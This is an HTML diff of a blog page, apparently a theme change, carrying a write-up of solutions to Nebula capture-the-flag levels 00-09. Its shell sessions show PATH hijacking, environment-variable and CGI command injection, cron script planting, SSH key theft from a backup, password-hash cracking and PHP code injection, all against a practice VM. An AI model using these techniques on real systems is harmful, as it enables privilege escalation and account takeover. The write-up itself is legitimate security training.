@@ -7,7 +7,17 @@
 	<meta name="author" content="Louis Li">
 
 	
-	<meta name="description" content="Nebula Shell Exploits (Solutions 00-09) Shell-based exploit exercises Overview Nebula is a series of “capture the flag” exercises from Exploit &hellip;">
+	<meta name="description" content="
+
+
+
+
+
+	Nebula Shell Exploits (Solutions 00-09)
+        Shell-based exploit exercises 
+	Overview
+
+Nebula is a series of “capture the flag” exercises...">
 	
 
   <!-- http://t.co/dKP3o1e -->
@@ -109,7 +119,7 @@
 
 <p>Nebula is a series of “capture the flag” exercises from <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. I’ve been reading <a href="http://www.amazon.com/Hacking-The-Art-Exploitation-Edition/dp/1593271441/">Hacking: The Art of Exploitation 2e</a> – this was a good supplement.</p>
 
-<p>The provided Ubuntu VM has 20 levels (00 - 19). The goal of each level is to run the <code>getflag</code> command on a target account, either by exploiting a <a href="http://en.wikipedia.org/wiki/Setuid">suid</a> program or obtaining the password.</p>
+<p>The provided Ubuntu VM has 20 levels (00 - 19). The goal of each level is to run the <code class="language-plaintext highlighter-rouge">getflag</code> command on a target account, either by exploiting a <a href="http://en.wikipedia.org/wiki/Setuid">suid</a> program or obtaining the password.</p>
 
 <h1 id="solutions">Solutions</h1>
 
@@ -121,154 +131,156 @@
 
 <p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level00">(full)</a>: Find a file with setuid permissions.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>find / -perm /u+s</code></pre></div>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>find / <span class="nt">-perm</span> /u+s</code></pre></figure>
 
-<p>Search the root directory for files based on permissions. The file <code>/bin/.../flag00</code> looks suspicious.</p>
+<p>Search the root directory for files based on permissions. The file <code class="language-plaintext highlighter-rouge">/bin/.../flag00</code> looks suspicious.</p>
 
 <!-- more -->
 
 <h2 id="level-1">Level 1</h2>
 
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level01">(full)</a>: Given a program that calls <code>/usr/bin/env echo and now what?</code>, execute an arbitrary program.</p>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level01">(full)</a>: Given a program that calls <code class="language-plaintext highlighter-rouge">/usr/bin/env echo and now what?</code>, execute an arbitrary program.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>~:<span class="nv">$PATH</span>
-<span class="gp">$</span> /bin/echo <span class="s2">&quot;whoami; getflag&quot;</span> &gt; ~/echo
-<span class="gp">$</span> chmod a+x ~/echo
-<span class="gp">$</span> /home/flag01/flag01</code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>~:<span class="nv">$PATH</span>
+<span class="gp">$</span><span class="w"> </span>/bin/echo <span class="s2">"whoami; getflag"</span> <span class="o">&gt;</span> ~/echo
+<span class="gp">$</span><span class="w"> </span><span class="nb">chmod </span>a+x ~/echo
+<span class="gp">$</span><span class="w"> </span>/home/flag01/flag01</code></pre></figure>
 
-<p><code>env</code> looks in the <code>PATH</code> variable to find a program to run. Adding an executable named <code>echo</code> to an earlier directory in the path will execute the program.</p>
+<p><code class="language-plaintext highlighter-rouge">env</code> looks in the <code class="language-plaintext highlighter-rouge">PATH</code> variable to find a program to run. Adding an executable named <code class="language-plaintext highlighter-rouge">echo</code> to an earlier directory in the path will execute the program.</p>
 
 <h2 id="level-2">Level 2</h2>
 
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level02">(full)</a>: Given a program that calls <code>/bin/echo $USER</code>, execute an arbitrary program.</p>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level02">(full)</a>: Given a program that calls <code class="language-plaintext highlighter-rouge">/bin/echo $USER</code>, execute an arbitrary program.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">USER</span><span class="o">=</span><span class="s2">&quot;hi echoing; whoami; getflag&quot;</span>
-<span class="gp">$</span> /home/flag02/flag02
-<span class="go">about to call system(&quot;/bin/echo hi echoing; whoami; getflag is cool&quot;)</span>
-<span class="go">hi echoing</span>
-<span class="go">flag02</span>
-<span class="go">You have successfully executed getflag on target account</span></code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">USER</span><span class="o">=</span><span class="s2">"hi echoing; whoami; getflag"</span>
+<span class="gp">$</span><span class="w"> </span>/home/flag02/flag02
+<span class="gp">about to call system("/bin/echo hi echoing;</span><span class="w"> </span><span class="nb">whoami</span><span class="p">;</span> getflag is cool<span class="s2">")
+</span><span class="go">hi echoing
+flag02
+You have successfully executed getflag on target account</span></code></pre></figure>
 
 <h2 id="level-3">Level 3</h2>
 
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level03">(full)</a>: There is a <code>cron</code> job that runs occasionally. In the home directory, there is a <code>writable.sh</code> and a <code>writable.d/</code>.</p>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level03">(full)</a>: There is a <code class="language-plaintext highlighter-rouge">cron</code> job that runs occasionally. In the home directory, there is a <code class="language-plaintext highlighter-rouge">writable.sh</code> and a <code class="language-plaintext highlighter-rouge">writable.d/</code>.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> /home/flag03
-<span class="gp">$</span> ls
-<span class="go">writable.d   writable.sh</span>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /home/flag03
+<span class="gp">$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">writable.d   writable.sh
 
-<span class="gp">$</span> <span class="c"># ./writable.sh runs a for loop with &quot;bash -x $i&quot; for i in writable.d/*</span>
-<span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;whoami&quot;</span> &gt; /tmp/log<span class="p">;</span> getflag &gt;&gt; /tmp/log<span class="err">&quot;</span> &gt; ./writable.d/foo
-<span class="gp">$</span> <span class="c"># Wait a few minutes for the cron job</span>
-<span class="gp">$</span> cat /tmp/log
-<span class="go">flag03</span>
-<span class="go">You have successfully executed getflag on target account</span></code></pre></div>
+</span><span class="gp">$</span><span class="w"> </span><span class="c"># ./writable.sh runs a for loop with "bash -x $i" for i in writable.d/*</span>
+<span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"whoami"</span> <span class="o">&gt;</span> /tmp/log<span class="p">;</span> getflag <span class="o">&gt;&gt;</span> /tmp/log<span class="s2">" &gt; ./writable.d/foo
+</span><span class="gp">$</span><span class="w"> </span><span class="s2"># Wait a few minutes for the cron job
+</span><span class="gp">$</span><span class="w"> </span><span class="s2">cat /tmp/log
+</span><span class="go">flag03
+You have successfully executed getflag on target account</span></code></pre></figure>
 
-<p>Since cron jobs don’t write output to <code>stdout</code>, the output should be logged in a file.</p>
+<p>Since cron jobs don’t write output to <code class="language-plaintext highlighter-rouge">stdout</code>, the output should be logged in a file.</p>
 
 <h2 id="level-4">Level 4</h2>
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level04">(full)</a>: The program <code>flag04</code> dumps the contents of a file to stdout, unless there is a substring match with the string <code>"token"</code>. Examine the file <code>/home/flag04/token/</code>.</p>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level04">(full)</a>: The program <code class="language-plaintext highlighter-rouge">flag04</code> dumps the contents of a file to stdout, unless there is a substring match with the string <code class="language-plaintext highlighter-rouge">"token"</code>. Examine the file <code class="language-plaintext highlighter-rouge">/home/flag04/token/</code>.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> /tmp/
-<span class="gp">$</span> ln -s /home/flag04/ ./foo
-<span class="gp">$</span> <span class="nb">cd</span> /home/flag04/
-<span class="gp">$</span> ./flag04 /tmp/foo</code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /tmp/
+<span class="gp">$</span><span class="w"> </span><span class="nb">ln</span> <span class="nt">-s</span> /home/flag04/ ./foo
+<span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /home/flag04/
+<span class="gp">$</span><span class="w"> </span>./flag04 /tmp/foo</code></pre></figure>
 
-<p><code>token</code> contains the password to the <code>flag04</code> account. <code>su flag04</code> and capture the flag.</p>
+<p><code class="language-plaintext highlighter-rouge">token</code> contains the password to the <code class="language-plaintext highlighter-rouge">flag04</code> account. <code class="language-plaintext highlighter-rouge">su flag04</code> and capture the flag.</p>
 
 <h2 id="level-5">Level 5</h2>
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level05">(full)</a>: Exploit the directory permissions in <code>/home/flag05/</code>.</p>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level05">(full)</a>: Exploit the directory permissions in <code class="language-plaintext highlighter-rouge">/home/flag05/</code>.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> /home/flag05
-<span class="gp">$</span> ls -la
-<span class="gp">$</span> <span class="sb">`</span>/home/flag05<span class="sb">`</span> contains <span class="sb">`</span>.ssh<span class="sb">`</span> <span class="o">(</span>unreadable<span class="o">)</span> and <span class="sb">`</span>.backup<span class="sb">`</span> <span class="o">(</span>execute access!<span class="o">)</span> directories
-<span class="gp">$</span> ls .backup
-<span class="go">backup-19072011.tgz</span>
-<span class="gp">$</span> <span class="c"># tar tzf backup-19072011.tgz shows that it contains the .ssh directory</span>
-<span class="gp">$</span> <span class="nb">cd</span> .backup
-<span class="gp">$</span> tar xzf backup-19072011.tgz -C ~
-<span class="gp">$</span> <span class="nb">cd</span> ~/.ssh
-<span class="gp">$</span> ssh -i id_rsa flag05@localhost
-<span class="gp">flag05@nebula:~$</span> getflag</code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /home/flag05
+<span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="gp">$</span><span class="w"> </span><span class="sb">`</span>/home/flag05<span class="sb">`</span> contains <span class="sb">`</span>.ssh<span class="sb">`</span> <span class="o">(</span>unreadable<span class="o">)</span> and <span class="sb">`</span>.backup<span class="sb">`</span> <span class="o">(</span>execute access!<span class="o">)</span> directories
+<span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> .backup
+<span class="go">backup-19072011.tgz
+</span><span class="gp">$</span><span class="w"> </span><span class="c"># tar tzf backup-19072011.tgz shows that it contains the .ssh directory</span>
+<span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> .backup
+<span class="gp">$</span><span class="w"> </span><span class="nb">tar </span>xzf backup-19072011.tgz <span class="nt">-C</span> ~
+<span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> ~/.ssh
+<span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-i</span> id_rsa flag05@localhost
+<span class="gp">flag05@nebula:~$</span><span class="w"> </span>getflag</code></pre></figure>
 
-<p>The <code>-C</code> flag for <code>tar</code> switches directories before unarchiving. We then ssh to our own machine, but this time as <code>flag05</code>.</p>
+<p>The <code class="language-plaintext highlighter-rouge">-C</code> flag for <code class="language-plaintext highlighter-rouge">tar</code> switches directories before unarchiving. We then ssh to our own machine, but this time as <code class="language-plaintext highlighter-rouge">flag05</code>.</p>
 
 <h2 id="level-6">Level 6</h2>
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level06">(full)</a>: The <code>flag06</code> account credentials are from a legacy UNIX system.</p>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level06">(full)</a>: The <code class="language-plaintext highlighter-rouge">flag06</code> account credentials are from a legacy UNIX system.</p>
 
-<p>Account credentials points toward <code>/etc/passwd</code>:</p>
+<p>Account credentials points toward <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> cat /etc/passwd/ <span class="p">|</span>  grep flag06
-<span class="go">flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</span></code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd/ |  <span class="nb">grep </span>flag06
+<span class="go">flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</span></code></pre></figure>
 
-<p>According to the Internet, older UNIX systems stored the salted, hashed passwords in <code>/etc/passwd</code>. Now, these are placed in the no-read <code>/etc/shadow/</code> (or a variant). The <code>flag06</code> is a one way hash, but <a href="http://www.openwall.com/john/">John the Ripper</a> can crack it. No special permissions are required to use it.</p>
+<p>According to the Internet, older UNIX systems stored the salted, hashed passwords in <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. Now, these are placed in the no-read <code class="language-plaintext highlighter-rouge">/etc/shadow/</code> (or a variant). The <code class="language-plaintext highlighter-rouge">flag06</code> is a one way hash, but <a href="http://www.openwall.com/john/">John the Ripper</a> can crack it. No special permissions are required to use it.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> ~
-<span class="gp">$</span> wget http://www.openwall.com/john/g/john-1.7.9.tar.gz
-<span class="gp">$</span> tar xzf john-1.7.9.tar.gz
-<span class="gp">$</span> <span class="nb">cd </span>john-1.7.9.tar.gz/src
-<span class="gp">$</span> make clean linux-x86-sse2
-<span class="gp">$</span> <span class="nb">cd</span> ../run
-<span class="gp">$</span> ./john /etc/passwd
-<span class="go">Loaded 1 password hash (Traditional DES [128/128 BS SSE2])</span>
-<span class="go">hello             (flag06)</span>
-<span class="go">...</span>
-<span class="gp">$</span> su flag06
-<span class="go">Password:</span>
-<span class="gp">sh-4.2$</span> getflag</code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> ~
+<span class="gp">$</span><span class="w"> </span>wget http://www.openwall.com/john/g/john-1.7.9.tar.gz
+<span class="gp">$</span><span class="w"> </span><span class="nb">tar </span>xzf john-1.7.9.tar.gz
+<span class="gp">$</span><span class="w"> </span><span class="nb">cd </span>john-1.7.9.tar.gz/src
+<span class="gp">$</span><span class="w"> </span>make clean linux-x86-sse2
+<span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> ../run
+<span class="gp">$</span><span class="w"> </span>./john /etc/passwd
+<span class="go">Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
+hello             (flag06)
+</span><span class="c">...
+</span><span class="gp">$</span><span class="w"> </span>su flag06
+<span class="go">Password:
+</span><span class="gp">sh-4.2$</span><span class="w"> </span>getflag</code></pre></figure>
 
 <h2 id="level-7">Level 7</h2>
 <p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level07">(full)</a>: A Perl CGI script attempts to ping a given host.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> /home/flag07
-<span class="gp">$</span> perl index.cgi <span class="nv">Host</span><span class="o">=</span><span class="s2">&quot;google.com | getflag&quot;</span>
-<span class="gp">$</span> <span class="c"># Yields a &quot;getflag is executing on a non-flag account, this doesn&#39;t count&quot;</span>
-<span class="gp">$</span> cat thttpd.conf <span class="p">|</span> grep flag07
-<span class="go">dir=/home/flag07</span>
-<span class="go">user=flag07</span>
-<span class="gp">$</span> ps aux <span class="p">|</span> grep thttpd
-<span class="gp">$</span> <span class="c"># Interestingly, two thttpd web server instances are running on flag07 and flag16</span>
-<span class="gp">$</span> cat thttpd.conf <span class="p">|</span> grep <span class="nv">port</span><span class="o">=</span>
-<span class="go">port=7007</span>
-<span class="gp">$</span> <span class="nb">cd</span> ~ <span class="o">&amp;&amp;</span> wget localhost:7007/index.cgi --post-data<span class="o">=</span><span class="s2">&quot;Host=google.com | getflag&quot;</span>
-<span class="gp">$</span> cat index.cgi
-<span class="go">&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;You have successfully executed getflag on a target account&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;</span></code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /home/flag07
+<span class="gp">$</span><span class="w"> </span>perl index.cgi <span class="nv">Host</span><span class="o">=</span><span class="s2">"google.com | getflag"</span>
+<span class="gp">$</span><span class="w"> </span><span class="c"># Yields a "getflag is executing on a non-flag account, this doesn't count"</span>
+<span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>thttpd.conf | <span class="nb">grep </span>flag07
+<span class="go">dir=/home/flag07
+user=flag07
+</span><span class="gp">$</span><span class="w"> </span>ps aux | <span class="nb">grep </span>thttpd
+<span class="gp">$</span><span class="w"> </span><span class="c"># Interestingly, two thttpd web server instances are running on flag07 and flag16</span>
+<span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>thttpd.conf | <span class="nb">grep </span><span class="nv">port</span><span class="o">=</span>
+<span class="go">port=7007
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> ~ <span class="o">&amp;&amp;</span> wget localhost:7007/index.cgi <span class="nt">--post-data</span><span class="o">=</span><span class="s2">"Host=google.com | getflag"</span>
+<span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>index.cgi
+<span class="gp">&lt;html&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;You have successfully executed getflag on a target account&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></figure>
 
-<p>If we run the script with <code>perl</code>, <code>getflag</code> still runs as the <code>level07</code> user. The vulnerability exists in <code>thttpd.conf</code>, which runs commands as <code>flag07</code> (<code>user=flag07</code>). Capturing the flag requires using <code>thttpd.conf</code>.</p>
+<p>If we run the script with <code class="language-plaintext highlighter-rouge">perl</code>, <code class="language-plaintext highlighter-rouge">getflag</code> still runs as the <code class="language-plaintext highlighter-rouge">level07</code> user. The vulnerability exists in <code class="language-plaintext highlighter-rouge">thttpd.conf</code>, which runs commands as <code class="language-plaintext highlighter-rouge">flag07</code> (<code class="language-plaintext highlighter-rouge">user=flag07</code>). Capturing the flag requires using <code class="language-plaintext highlighter-rouge">thttpd.conf</code>.</p>
 
-<p><code>ps aux</code> shows that a web server using <a href="http://www.acme.com/software/thttpd/">thttpd</a> is running. Using <code>wget localhost:7007/index.cgi</code>, the parameter is passed in as the <code>flag07</code> user.</p>
+<p><code class="language-plaintext highlighter-rouge">ps aux</code> shows that a web server using <a href="http://www.acme.com/software/thttpd/">thttpd</a> is running. Using <code class="language-plaintext highlighter-rouge">wget localhost:7007/index.cgi</code>, the parameter is passed in as the <code class="language-plaintext highlighter-rouge">flag07</code> user.</p>
 
 <h2 id="level-8">Level 8</h2>
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level08">(full)</a>: Examine a <code>capture.pcap</code> file to see what <code>flag08</code> was doing.</p>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level08">(full)</a>: Examine a <code class="language-plaintext highlighter-rouge">capture.pcap</code> file to see what <code class="language-plaintext highlighter-rouge">flag08</code> was doing.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> /home/flag08
-<span class="gp">$</span> <span class="c"># -X prints in ASCII; -q removes extraneous information, -r points to a file</span>
-<span class="gp">$</span> tcpdump -X -q -r capture.pcap <span class="p">|</span> less</code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /home/flag08
+<span class="gp">$</span><span class="w"> </span><span class="c"># -X prints in ASCII; -q removes extraneous information, -r points to a file</span>
+<span class="gp">$</span><span class="w"> </span>tcpdump <span class="nt">-X</span> <span class="nt">-q</span> <span class="nt">-r</span> capture.pcap | less</code></pre></figure>
 
-<p>After mucking around with <code>tcpdump</code> in ASCII mode, however, it’s clear that the output is still unintelligible. The Internet (broadly speaking) suggests Wireshark (and its command line counterpart, <code>tshark</code>) to examine packets, but the virtual machine doesn’t have these. However, a program named <code>tcpflow</code> is available.</p>
+<p>After mucking around with <code class="language-plaintext highlighter-rouge">tcpdump</code> in ASCII mode, however, it’s clear that the output is still unintelligible. The Internet (broadly speaking) suggests Wireshark (and its command line counterpart, <code class="language-plaintext highlighter-rouge">tshark</code>) to examine packets, but the virtual machine doesn’t have these. However, a program named <code class="language-plaintext highlighter-rouge">tcpflow</code> is available.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="c"># -c prints to stdout, -r points to a file</span>
-<span class="gp">$</span> tcpflow -c -r capture.pcap <span class="p">|</span> less</code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="c"># -c prints to stdout, -r points to a file</span>
+<span class="gp">$</span><span class="w"> </span>tcpflow <span class="nt">-c</span> <span class="nt">-r</span> capture.pcap | less</code></pre></figure>
 
-<p>After the <code>Password:</code> prompt, the <code>flag08</code> user typed “backdoor…00Rm8.ate”. A few tries for <code>su flag08</code> with <code>backdoor</code> and <code>backdoor...00Rm8.ate</code> are unsuccessful. But if we believe that:
-1. the password is based on words
-2. each packet represents a key press to the server
-“Backdoor mate” could be <code>backdoorm8</code>, <code>backd00Rm8</code>, etc. If the period represents deletion, then the password is <code>backd00Rmate</code>.</p>
+<p>After the <code class="language-plaintext highlighter-rouge">Password:</code> prompt, the <code class="language-plaintext highlighter-rouge">flag08</code> user typed “backdoor…00Rm8.ate”. A few tries for <code class="language-plaintext highlighter-rouge">su flag08</code> with <code class="language-plaintext highlighter-rouge">backdoor</code> and <code class="language-plaintext highlighter-rouge">backdoor...00Rm8.ate</code> are unsuccessful. But if we believe that:</p>
+<ol>
+  <li>the password is based on words</li>
+  <li>each packet represents a key press to the server
+“Backdoor mate” could be <code class="language-plaintext highlighter-rouge">backdoorm8</code>, <code class="language-plaintext highlighter-rouge">backd00Rm8</code>, etc. If the period represents deletion, then the password is <code class="language-plaintext highlighter-rouge">backd00Rmate</code>.</li>
+</ol>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> su flag08
-<span class="go">Password:</span>
-<span class="gp">sh-4.2$</span> getflag</code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>su flag08
+<span class="go">Password:
+</span><span class="gp">sh-4.2$</span><span class="w"> </span>getflag</code></pre></figure>
 
 <h2 id="level-9">Level 9</h2>
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level09">(full)</a>: Exploit a C wrapper for a PHP script. The PHP script uses one argument but accepts a second, unused one – <code>$useme</code>.</p>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level09">(full)</a>: Exploit a C wrapper for a PHP script. The PHP script uses one argument but accepts a second, unused one – <code class="language-plaintext highlighter-rouge">$useme</code>.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> ~
-<span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;[email {\$use_me(getflag)}]&quot;</span> &gt; foo
-<span class="gp">$</span> /home/flag09/flag09 ./foo <span class="nb">exec</span>
-<span class="go">[error]</span>
-<span class="go">You have successfully executed getflag on target account</span></code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> ~
+<span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"[email {</span><span class="se">\$</span><span class="s2">use_me(getflag)}]"</span> <span class="o">&gt;</span> foo
+<span class="gp">$</span><span class="w"> </span>/home/flag09/flag09 ./foo <span class="nb">exec</span>
+<span class="go">[error]
+You have successfully executed getflag on target account</span></code></pre></figure>
 
-<p>This exploits PHP’s “variable of variables.” Executing <code>flag09 ~/foo system</code> also works.</p>
+<p>This exploits PHP’s “variable of variables.” Executing <code class="language-plaintext highlighter-rouge">flag09 ~/foo system</code> also works.</p>
 </div>
 
 </article>
@@ -313,11 +325,11 @@
 </div>
 			</div>
 			<footer id="footer" class="inner"><p>
-  Copyright &copy; 2020 - Louis Li -
-  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+  Copyright &copy; 2020 - Louis Li
 </p>
 
-Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a></footer>
+Theme originally by <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a>
+</footer>
 			<script src="/javascripts/slash.js"></script>
 <script src="/javascripts/jquery.fancybox.pack.js"></script>
 <script type="text/javascript">
